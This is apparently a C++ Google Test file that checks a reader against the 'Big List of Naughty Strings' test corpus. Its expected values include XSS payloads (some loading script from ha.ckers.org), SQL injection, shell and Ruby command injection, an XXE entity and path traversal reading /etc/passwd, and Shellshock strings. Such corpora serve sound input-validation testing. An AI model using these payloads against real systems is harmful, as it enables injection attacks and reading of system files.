	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x85javascript:alert(1)</script>", helpers::wide(ReadSection(15493, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x88javascript:alert(1)</script>", helpers::wide(ReadSection(15546, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x00javascript:alert(1)</script>", helpers::wide(ReadSection(15599, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>", helpers::wide(ReadSection(15644, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>", helpers::wide(ReadSection(15697, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>", helpers::wide(ReadSection(15750, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x0Cjavascript:alert(1)</script>", helpers::wide(ReadSection(15803, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x2Bjavascript:alert(1)</script>", helpers::wide(ReadSection(15848, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>", helpers::wide(ReadSection(15893, 56)).c_str());
	EXPECT_STREQ(L"\"`'><script>-javascript:alert(1)</script>", helpers::wide(ReadSection(15950, 41)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x0Ajavascript:alert(1)</script>", helpers::wide(ReadSection(15992, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>", helpers::wide(ReadSection(16037, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x7Ejavascript:alert(1)</script>", helpers::wide(ReadSection(16090, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x87javascript:alert(1)</script>", helpers::wide(ReadSection(16135, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>", helpers::wide(ReadSection(16188, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>", helpers::wide(ReadSection(16241, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xC2\\x85javascript:alert(1)</script>", helpers::wide(ReadSection(16294, 48)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>", helpers::wide(ReadSection(16343, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x83javascript:alert(1)</script>", helpers::wide(ReadSection(16396, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>", helpers::wide(ReadSection(16449, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>", helpers::wide(ReadSection(16502, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x80javascript:alert(1)</script>", helpers::wide(ReadSection(16555, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x21javascript:alert(1)</script>", helpers::wide(ReadSection(16608, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x82javascript:alert(1)</script>", helpers::wide(ReadSection(16653, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE2\\x80\\x86javascript:alert(1)</script>", helpers::wide(ReadSection(16706, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>", helpers::wide(ReadSection(16759, 52)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x0Bjavascript:alert(1)</script>", helpers::wide(ReadSection(16812, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\x20javascript:alert(1)</script>", helpers::wide(ReadSection(16857, 44)).c_str());
	EXPECT_STREQ(L"\"`'><script>\\xC2\\xA0javascript:alert(1)</script>", helpers::wide(ReadSection(16902, 48)).c_str());
	EXPECT_STREQ(L"<img \\x00src=x onerror=\"alert(1)\">", helpers::wide(ReadSection(16951, 34)).c_str());
	EXPECT_STREQ(L"<img \\x47src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(16986, 45)).c_str());
	EXPECT_STREQ(L"<img \\x11src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17032, 45)).c_str());
	EXPECT_STREQ(L"<img \\x12src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17078, 45)).c_str());
	EXPECT_STREQ(L"<img\\x47src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17124, 44)).c_str());
	EXPECT_STREQ(L"<img\\x10src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17169, 44)).c_str());
	EXPECT_STREQ(L"<img\\x13src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17214, 44)).c_str());
	EXPECT_STREQ(L"<img\\x32src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17259, 44)).c_str());
	EXPECT_STREQ(L"<img\\x47src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17304, 44)).c_str());
	EXPECT_STREQ(L"<img\\x11src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17349, 44)).c_str());
	EXPECT_STREQ(L"<img \\x47src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17394, 45)).c_str());
	EXPECT_STREQ(L"<img \\x34src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17440, 45)).c_str());
	EXPECT_STREQ(L"<img \\x39src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17486, 45)).c_str());
	EXPECT_STREQ(L"<img \\x00src=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17532, 45)).c_str());
	EXPECT_STREQ(L"<img src\\x09=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17578, 45)).c_str());
	EXPECT_STREQ(L"<img src\\x10=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17624, 45)).c_str());
	EXPECT_STREQ(L"<img src\\x13=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17670, 45)).c_str());
	EXPECT_STREQ(L"<img src\\x32=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17716, 45)).c_str());
	EXPECT_STREQ(L"<img src\\x12=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17762, 45)).c_str());
	EXPECT_STREQ(L"<img src\\x11=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17808, 45)).c_str());
	EXPECT_STREQ(L"<img src\\x00=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17854, 45)).c_str());
	EXPECT_STREQ(L"<img src\\x47=x onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17900, 45)).c_str());
	EXPECT_STREQ(L"<img src=x\\x09onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17946, 44)).c_str());
	EXPECT_STREQ(L"<img src=x\\x10onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(17991, 44)).c_str());
	EXPECT_STREQ(L"<img src=x\\x11onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(18036, 44)).c_str());
	EXPECT_STREQ(L"<img src=x\\x12onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(18081, 44)).c_str());
	EXPECT_STREQ(L"<img src=x\\x13onerror=\"javascript:alert(1)\">", helpers::wide(ReadSection(18126, 44)).c_str());
	EXPECT_STREQ(L"<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">", helpers::wide(ReadSection(18171, 46)).c_str());
	EXPECT_STREQ(L"<img src=x onerror=\\x09\"javascript:alert(1)\">", helpers::wide(ReadSection(18218, 45)).c_str());
	EXPECT_STREQ(L"<img src=x onerror=\\x10\"javascript:alert(1)\">", helpers::wide(ReadSection(18264, 45)).c_str());
	EXPECT_STREQ(L"<img src=x onerror=\\x11\"javascript:alert(1)\">", helpers::wide(ReadSection(18310, 45)).c_str());
	EXPECT_STREQ(L"<img src=x onerror=\\x12\"javascript:alert(1)\">", helpers::wide(ReadSection(18356, 45)).c_str());
	EXPECT_STREQ(L"<img src=x onerror=\\x32\"javascript:alert(1)\">", helpers::wide(ReadSection(18402, 45)).c_str());
	EXPECT_STREQ(L"<img src=x onerror=\\x00\"javascript:alert(1)\">", helpers::wide(ReadSection(18448, 45)).c_str());
	EXPECT_STREQ(L"<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>", helpers::wide(ReadSection(18494, 78)).c_str());
	EXPECT_STREQ(L"<img src=\"x` `<script>javascript:alert(1)</script>\"` `>", helpers::wide(ReadSection(18573, 55)).c_str());
	EXPECT_STREQ(L"<img src onerror /\" '\"= alt=javascript:alert(1)//\">", helpers::wide(ReadSection(18629, 51)).c_str());
	EXPECT_STREQ(L"<title onpropertychange=javascript:alert(1)></title><title title=>", helpers::wide(ReadSection(18681, 66)).c_str());
	EXPECT_STREQ(L"<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">", helpers::wide(ReadSection(18748, 92)).c_str());
	EXPECT_STREQ(L"<!--[if]><script>javascript:alert(1)</script -->", helpers::wide(ReadSection(18841, 48)).c_str());
	EXPECT_STREQ(L"<!--[if<img src=x onerror=javascript:alert(1)//]> -->", helpers::wide(ReadSection(18890, 53)).c_str());
	EXPECT_STREQ(L"<script src=\"/\\%(jscript)s\"></script>", helpers::wide(ReadSection(18944, 37)).c_str());
	EXPECT_STREQ(L"<script src=\"\\\\%(jscript)s\"></script>", helpers::wide(ReadSection(18982, 37)).c_str());
	EXPECT_STREQ(L"<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">", helpers::wide(ReadSection(19020, 40)).c_str());
	EXPECT_STREQ(L"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", helpers::wide(ReadSection(19061, 57)).c_str());
	EXPECT_STREQ(L"<IMG SRC=# onmouseover=\"alert('xxs')\">", helpers::wide(ReadSection(19119, 38)).c_str());
	EXPECT_STREQ(L"<IMG SRC= onmouseover=\"alert('xxs')\">", helpers::wide(ReadSection(19158, 37)).c_str());
	EXPECT_STREQ(L"<IMG onmouseover=\"alert('xxs')\">", helpers::wide(ReadSection(19196, 32)).c_str());
	EXPECT_STREQ(L"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>", helpers::wide(ReadSection(19229, 136)).c_str());
	EXPECT_STREQ(L"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>", helpers::wide(ReadSection(19366, 217)).c_str());
	EXPECT_STREQ(L"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>", helpers::wide(ReadSection(19584, 125)).c_str());
	EXPECT_STREQ(L"<IMG SRC=\"jav   ascript:alert('XSS');\">", helpers::wide(ReadSection(19710, 39)).c_str());
	EXPECT_STREQ(L"<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">", helpers::wide(ReadSection(19750, 42)).c_str());
	EXPECT_STREQ(L"<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">", helpers::wide(ReadSection(19793, 42)).c_str());
	EXPECT_STREQ(L"<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">", helpers::wide(ReadSection(19836, 42)).c_str());
	EXPECT_STREQ(L"perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out", helpers::wide(ReadSection(19879, 62)).c_str());
	EXPECT_STREQ(L"<IMG SRC=\" &#14;  javascript:alert('XSS');\">", helpers::wide(ReadSection(19942, 44)).c_str());
	EXPECT_STREQ(L"<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", helpers::wide(ReadSection(19987, 54)).c_str());
	EXPECT_STREQ(L"<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>", helpers::wide(ReadSection(20042, 51)).c_str());
	EXPECT_STREQ(L"<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>", helpers::wide(ReadSection(20094, 50)).c_str());
	EXPECT_STREQ(L"<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", helpers::wide(ReadSection(20145, 34)).c_str());
	EXPECT_STREQ(L"<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >", helpers::wide(ReadSection(20180, 44)).c_str());
	EXPECT_STREQ(L"<SCRIPT SRC=//ha.ckers.org/.j>", helpers::wide(ReadSection(20225, 30)).c_str());
	EXPECT_STREQ(L"<IMG SRC=\"javascript:alert('XSS')\"", helpers::wide(ReadSection(20256, 34)).c_str());
	EXPECT_STREQ(L"<iframe src=http://ha.ckers.org/scriptlet.html <", helpers::wide(ReadSection(20291, 48)).c_str());
	EXPECT_STREQ(L"\\\";alert('XSS');//", helpers::wide(ReadSection(20340, 18)).c_str());
	EXPECT_STREQ(L"<plaintext>", helpers::wide(ReadSection(20359, 11)).c_str());
}

TEST_F(NaughtyStrings, SqlInjection)
{
	EXPECT_STREQ(L"1;DROP TABLE users", helpers::wide(ReadSection(20461, 18)).c_str());
	EXPECT_STREQ(L"1'; DROP TABLE users-- 1", helpers::wide(ReadSection(20480, 24)).c_str());
	EXPECT_STREQ(L"' OR 1=1 -- 1", helpers::wide(ReadSection(20505, 13)).c_str());
	EXPECT_STREQ(L"' OR '1'='1", helpers::wide(ReadSection(20519, 11)).c_str());
}

TEST_F(NaughtyStrings, ServerCodeInjection)
{
	EXPECT_STREQ(L"-", helpers::wide(ReadSection(20685, 1)).c_str());
	EXPECT_STREQ(L"--", helpers::wide(ReadSection(20687, 2)).c_str());
	EXPECT_STREQ(L"--version", helpers::wide(ReadSection(20690, 9)).c_str());
	EXPECT_STREQ(L"--help", helpers::wide(ReadSection(20700, 6)).c_str());
	EXPECT_STREQ(L"$USER", helpers::wide(ReadSection(20707, 5)).c_str());
	EXPECT_STREQ(L"/dev/null; touch /tmp/blns.fail ; echo", helpers::wide(ReadSection(20713, 38)).c_str());
	EXPECT_STREQ(L"`touch /tmp/blns.fail`", helpers::wide(ReadSection(20752, 22)).c_str());
	EXPECT_STREQ(L"$(touch /tmp/blns.fail)", helpers::wide(ReadSection(20775, 23)).c_str());
	EXPECT_STREQ(L"@{[system \"touch /tmp/blns.fail\"]}", helpers::wide(ReadSection(20799, 34)).c_str());
}

TEST_F(NaughtyStrings, CommandInjectionRuby)
{
	EXPECT_STREQ(L"eval(\"puts 'hello world'\")", helpers::wide(ReadSection(20937, 26)).c_str());
	EXPECT_STREQ(L"System(\"ls -al /\")", helpers::wide(ReadSection(20964, 18)).c_str());
	EXPECT_STREQ(L"`ls -al /`", helpers::wide(ReadSection(20983, 10)).c_str());
	EXPECT_STREQ(L"Kernel.exec(\"ls -al /\")", helpers::wide(ReadSection(20994, 23)).c_str());
	EXPECT_STREQ(L"Kernel.exit(1)", helpers::wide(ReadSection(21018, 14)).c_str());
	EXPECT_STREQ(L"%x('ls -al /')", helpers::wide(ReadSection(21033, 14)).c_str());
}

TEST_F(NaughtyStrings, XxeInjectionXml)
{
	EXPECT_STREQ(L"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>", helpers::wide(ReadSection(21163, 138)).c_str());
}

TEST_F(NaughtyStrings, UnwantedInterpolation)
{
	EXPECT_STREQ(L"$HOME", helpers::wide(ReadSection(21609, 5)).c_str());
	EXPECT_STREQ(L"$ENV{'HOME'}", helpers::wide(ReadSection(21615, 12)).c_str());
	EXPECT_STREQ(L"%d", helpers::wide(ReadSection(21628, 2)).c_str());
	EXPECT_STREQ(L"%s", helpers::wide(ReadSection(21631, 2)).c_str());
	EXPECT_STREQ(L"%*.*s", helpers::wide(ReadSection(21634, 5)).c_str());
}

TEST_F(NaughtyStrings, FileInclusion)
{
	EXPECT_STREQ(L"../../../../../../../../../../../etc/passwd%00", helpers::wide(ReadSection(21751, 46)).c_str());
	EXPECT_STREQ(L"../../../../../../../../../../../etc/hosts", helpers::wide(ReadSection(21798, 42)).c_str());
}

TEST_F(NaughtyStrings, KnownCvesAndVulnerabilities)
{
	EXPECT_STREQ(L"() { 0; }; touch /tmp/blns.shellshock1.fail;", helpers::wide(ReadSection(21924, 44)).c_str());
	EXPECT_STREQ(L"() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }", helpers::wide(ReadSection(21969, 58)).c_str());
}

TEST_F(NaughtyStrings, MsdosWindowsSpecialFilenames)
{
	EXPECT_STREQ(L"CON", helpers::wide(ReadSection(22123, 3)).c_str());
	EXPECT_STREQ(L"PRN", helpers::wide(ReadSection(22127, 3)).c_str());
	EXPECT_STREQ(L"AUX", helpers::wide(ReadSection(22131, 3)).c_str());
	EXPECT_STREQ(L"CLOCK$", helpers::wide(ReadSection(22135, 6)).c_str());
	EXPECT_STREQ(L"NUL", helpers::wide(ReadSection(22142, 3)).c_str());
	EXPECT_STREQ(L"A:", helpers::wide(ReadSection(22146, 2)).c_str());
	EXPECT_STREQ(L"ZZ:", helpers::wide(ReadSection(22149, 3)).c_str());
	EXPECT_STREQ(L"COM1", helpers::wide(ReadSection(22153, 4)).c_str());
	EXPECT_STREQ(L"LPT1", helpers::wide(ReadSection(22158, 4)).c_str());
	EXPECT_STREQ(L"LPT2", helpers::wide(ReadSection(22163, 4)).c_str());
	EXPECT_STREQ(L"LPT3", helpers::wide(ReadSection(22168, 4)).c_str());
	EXPECT_STREQ(L"COM2", helpers::wide(ReadSection(22173, 4)).c_str());
	EXPECT_STREQ(L"COM3", helpers::wide(ReadSection(22178, 4)).c_str());
	EXPECT_STREQ(L"COM4", helpers::wide(ReadSection(22183, 4)).c_str());
}

TEST_F(NaughtyStrings, ScunthorpeProblem)
{
	EXPECT_STREQ(L"Scunthorpe General Hospital", helpers::wide(ReadSection(22326, 27)).c_str());
	EXPECT_STREQ(L"Penistone Community Church", helpers::wide(ReadSection(22354, 26)).c_str());
	EXPECT_STREQ(L"Lightwater Country Park", helpers::wide(ReadSection(22381, 23)).c_str());
	EXPECT_STREQ(L"Jimmy Clitheroe", helpers::wide(ReadSection(22405, 15)).c_str());
	EXPECT_STREQ(L"Horniman Museum", helpers::wide(ReadSection(22421, 15)).c_str());
	EXPECT_STREQ(L"shitake mushrooms", helpers::wide(ReadSection(22437, 17)).c_str());
	EXPECT_STREQ(L"RomansInSussex.co.uk", helpers::wide(ReadSection(22455, 20)).c_str());
	EXPECT_STREQ(L"http://www.cum.qc.ca/", helpers::wide(ReadSection(22476, 21)).c_str());
	EXPECT_STREQ(L"Craig Cockburn, Software Specialist", helpers::wide(ReadSection(22498, 35)).c_str());
	EXPECT_STREQ(L"Linda Callahan", helpers::wide(ReadSection(22534, 14)).c_str());
	EXPECT_STREQ(L"Dr. Herman I. Libshitz", helpers::wide(ReadSection(22549, 22)).c_str());
	EXPECT_STREQ(L"magna cum laude", helpers::wide(ReadSection(22572, 15)).c_str());
	EXPECT_STREQ(L"Super Bowl XXX", helpers::wide(ReadSection(22588, 14)).c_str());
	EXPECT_STREQ(L"medieval erection of parapets", helpers::wide(ReadSection(22603, 29)).c_str());
	EXPECT_STREQ(L"evaluate", helpers::wide(ReadSection(22633, 8)).c_str());
	EXPECT_STREQ(L"mocha", helpers::wide(ReadSection(22642, 5)).c_str());
	EXPECT_STREQ(L"expression", helpers::wide(ReadSection(22648, 10)).c_str());
	EXPECT_STREQ(L"Arsenal canal", helpers::wide(ReadSection(22659, 13)).c_str());
	EXPECT_STREQ(L"classic", helpers::wide(ReadSection(22673, 7)).c_str());
	EXPECT_STREQ(L"Tyson Gay", helpers::wide(ReadSection(22681, 9)).c_str());
}

TEST_F(NaughtyStrings, HumanInjection)
{
	EXPECT_STREQ(L"If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.", helpers::wide(ReadSection(22770, 211)).c_str());
}

TEST_F(NaughtyStrings, TerminalEscapeCodes)
{
	EXPECT_STREQ(L"Roses are \x1B[0;31mred\x1B[0m, violets are \x1B[0;34mblue. Hope you enjoy terminal hue", helpers::wide(ReadSection(23073, 78)).c_str());
	EXPECT_STREQ(L"But now...\x1B[20Cfor my greatest trick...\x1B[8m", helpers::wide(ReadSection(23152, 43)).c_str());
	EXPECT_STREQ(L"The quic\b\b\b\b\b\bk brown fo\a\a\a\a\a\a\a\a\a\a\ax... [Beeeep]", helpers::wide(ReadSection(23196, 48)).c_str());
}

TEST_F(NaughtyStrings, IosVulnerability)
{
	EXPECT_STREQ(L"Power\x644\x64F\x644\x64F\x635\x651\x628\x64F\x644\x64F\x644\x635\x651\x628\x64F\x631\x631\x64B \x963 \x963" L"h \x963 \x963\x5197", helpers::wide(ReadSection(23334, 61)).c_str());
}